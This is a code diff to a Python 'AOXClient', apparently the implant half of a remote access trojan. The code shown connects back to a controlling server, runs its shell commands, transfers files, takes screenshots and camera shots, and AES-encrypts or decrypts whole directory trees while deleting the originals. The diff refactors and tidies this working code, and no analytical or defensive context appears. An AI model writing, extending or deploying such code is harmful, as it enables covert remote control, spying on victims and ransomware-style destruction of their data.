@@ -33,7 +33,6 @@ class AOXClient:
             try:
                 self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.sock.connect((self.host, self.port))
-                print("[+]Connected ")
                 break
             except socket.error as err:
                 time.sleep(120)  # try to reconnect after 2 minutes
@@ -50,9 +49,6 @@ class AOXClient:
                 if "/" in cmd:
                     filename = cmd.split("/")[-1]
                     self.receive_file(self.sock, filename)
-                else:
-                    filename = str(cmd.split()[-1])
-                    self.receive_file(self.sock, filename)
             elif cmd == "screenshot":
                 self.screenshot(self.sock)
             elif cmd == "camshot":
@@ -65,14 +61,10 @@ class AOXClient:
                 cmd = cmd.split(" ", 2)
                 if len(cmd) == 2:
                     self.encrypt_All_Files(self.sock, "".join(cmd[1]), "".join(os.getcwd()))
-                elif len(cmd) == 3:
-                    self.encrypt_All_Files(self.sock, "".join(cmd[1]), "".join(cmd[2]))
             elif "decrypt" in cmd:
                 cmd = cmd.split(" ", 2)
                 if len(cmd) == 2:
                     self.decrypt_All_Files(self.sock, "".join(cmd[1]), "".join(os.getcwd()))
-                elif len(cmd) == 3:
-                    self.decrypt_All_Files(self.sock, "".join(cmd[1]), "".join(cmd[2]))
             elif cmd[:2] == 'cd':
                 # change directory
                 try:
@@ -87,7 +79,7 @@ class AOXClient:
                     else:
                         self.sock.send(f"{str(result)}{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                 except(FileNotFoundError, IOError):
-                    self.sock.send(f"Directory does not exist!!! \n {self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+                    self.sock.send(f"Directory does not exist!!! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
             else:
                 # return terminal output back to server
                 terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
@@ -102,21 +94,20 @@ class AOXClient:
     def send_file(self, conn, usrFile):
             try:
                 if not os.path.exists(usrFile):
-                    conn.send(f"[-]File does not exist!\n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+                    conn.send(f"[-]File does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                 elif not os.path.isfile(usrFile):
                     if os.path.isdir(usrFile):
                         conn.send(
-                            f"[-]'{usrFile}' is a directory, not a file!\n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+                            f"[-]'{usrFile}' is a directory, not a file! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                     else:
                         conn.send(
-                            f"[-]'{usrFile}' is not a regular file!\n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+                            f"[-]'{usrFile}' is not a regular file! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                 else:
                     conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                     time.sleep(1)
                     fileSize = os.path.getsize(usrFile)
                     conn.send(str(fileSize).encode())
                     time.sleep(1)
-
                     with open(usrFile, 'rb') as file:
                         data = file.read(1024)
                         if fileSize == 0:
@@ -309,9 +300,9 @@ class AOXClient:
                             outfile.write(encrypt_file.encrypt(block))  # encrypt block
                         usrFile.close()
                     os.remove(file)
-            conn.send(f"[+]{str(file_counter)} files have been encrypted! {self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+            conn.send(f"[+]{str(file_counter)} files have been encrypted! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
         else:
-            conn.send(f"[-]Directory or file specified does not exist! {self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+            conn.send(f"[-]Directory or file specified does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
 
 
 
@@ -322,6 +313,7 @@ class AOXClient:
         if os.path.exists(directory):
             file_paths = []
 
+            # Walk through the directory and gather all files
             for root, directories, files in os.walk(directory):
                 for filename in files:
                     filepath = os.path.join(root, filename)
@@ -329,15 +321,17 @@ class AOXClient:
 
             for usrFile in file_paths:
                 file_counter += 1
-                outputFile = usrFile.split("\\")
-                outputFile = "".join(outputFile[-1])
-                outputFile = outputFile.replace("(Encrypted)", "") # remove (Encrypted from file name)
+                # Split the path to get the file name and extension separately
+                file_name, file_extension = os.path.splitext(os.path.basename(usrFile))
+                # Remove "(Encrypted)" from the file name if present and append extension
+                outputFile = file_name.replace("(Encrypted)", "") + file_extension
+                # Construct full path for the output file
                 outputFile = os.path.join(directory, outputFile)
 
                 with open(usrFile, 'rb') as encrypted_file:
                     filesize = int(encrypted_file.read(16))
-                    IV = encrypted_file.read(AES.block_size)  # initialization vector for randomisation
-                    decrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)
+                    IV = encrypted_file.read(AES.block_size)  # initialization vector for randomization
+                    decryptor = AES.new(hashed_key, AES.MODE_CBC, IV)
 
                     with open(outputFile, 'wb') as decrypted_file:
                         while True:
@@ -345,11 +339,17 @@ class AOXClient:
 
                             if len(block) == 0:
                                 break
-                            decrypted_file.write(decrypt_file.decrypt(block)) # decrypt block
+
+                            decrypted_file.write(decryptor.decrypt(block))
+
+                        # Truncate the decrypted file to the original filesize
                         decrypted_file.truncate(filesize)
 
+                # Remove the original (now decrypted) file
                 os.remove(usrFile)
-            conn.send(f"[+]{str(file_counter)} files have been decrypted! {self.style_text('AOX')} {str(os.getcwd())}: ".encode())
-        else:
-            conn.send(f"[-]Directory or file specified does not exist! {self.style_text('AOX')} {str(os.getcwd())}: ".encode())
 
+            conn.send(
+                f"[+]{str(file_counter)} files have been decrypted! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
+        else:
+            conn.send(
+                f"[-]Directory or file specified does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
